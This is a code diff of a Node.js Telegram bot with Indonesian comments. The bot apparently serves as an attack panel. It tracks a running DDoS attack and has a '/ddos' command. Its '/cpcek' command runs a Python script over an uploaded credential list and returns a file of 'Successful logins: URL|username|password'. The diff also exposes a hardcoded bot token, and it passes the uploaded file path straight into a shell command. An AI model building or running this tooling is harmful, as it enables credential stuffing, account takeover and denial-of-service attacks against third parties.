@@ -2,7 +2,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 const fs = require('fs');
 const request = require('request');
-const token = '6674838409:AAHLkaUy93k648M8FlvlhBddJLD0NgfzYd0';
+const token = '6674838409:AAHLkaUy93k648M8FlvlhBddJLD0NgfzYd0'; // Ganti dengan token bot Anda
 const bot = new TelegramBot(token, { polling: true });
 
 let isDDOSRunning = false; // Variabel untuk menandai apakah serangan DDOS sedang berlangsung
@@ -205,42 +205,42 @@ bot.onText(/\/cpcek/, (msg) => {
 
                 const intervalId = setInterval(() => {
                     sendProgressUpdate(chatId, messageId, progress);
-                progress += 10; // Increment progress by 10%
-            }, 5000); // Check progress every 5 seconds
+                    progress += 10; // Increment progress by 10%
+                }, 5000); // Check progress every 5 seconds
 
-            exec(`python3 cp.py ${filePath} 10`, (error, stdout, stderr) => {
-                clearInterval(intervalId); // Stop checking progress
-                if (error) {
-                    bot.sendMessage(chatId, `Error: ${error.message}`);
-                    console.error(`Error: ${error.message}`);
-                    return;
-                }
-                if (stderr) {
-                    bot.sendMessage(chatId, `Stderr: ${stderr}`);
-                    console.error(`Stderr: ${stderr}`);
-                    return;
-                }
+                exec(`python3 cp.py ${filePath} 10`, (error, stdout, stderr) => {
+                    clearInterval(intervalId); // Stop checking progress
+                    if (error) {
+                        bot.sendMessage(chatId, `Error: ${error.message}`);
+                        console.error(`Error: ${error.message}`);
+                        return;
+                    }
+                    if (stderr) {
+                        bot.sendMessage(chatId, `Stderr: ${stderr}`);
+                        console.error(`Stderr: ${stderr}`);
+                        return;
+                    }
 
-                console.log(`Stdout: ${stdout}`);
-                bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
+                    console.log(`Stdout: ${stdout}`);
+                    bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
 
-                const goodFilePath = './good.txt';
-                if (fs.existsSync(goodFilePath)) {
-                    bot.sendDocument(chatId, goodFilePath, { caption: 'Successful logins: URL|username|password' }).then(() => {
-                        fs.unlinkSync(goodFilePath);
-                    });
-                } else {
-                    bot.sendMessage(chatId, 'No successful logins found.');
-                }
+                    const goodFilePath = './good.txt';
+                    if (fs.existsSync(goodFilePath)) {
+                        bot.sendDocument(chatId, goodFilePath, { caption: 'Successful logins: URL|username|password' }).then(() => {
+                            fs.unlinkSync(goodFilePath);
+                        });
+                    } else {
+                        bot.sendMessage(chatId, 'No successful logins found.');
+                    }
+                });
             });
         });
-    });
 
-    writeStream.on('error', (error) => {
-        bot.sendMessage(chatId, `Failed to write file: ${error.message}`);
-        console.error(`Failed to write file: ${error.message}`);
+        writeStream.on('error', (error) => {
+            bot.sendMessage(chatId, `Failed to write file: ${error.message}`);
+            console.error(`Failed to write file: ${error.message}`);
+        });
     });
-});
 });
 
 // Handler untuk command /ddos
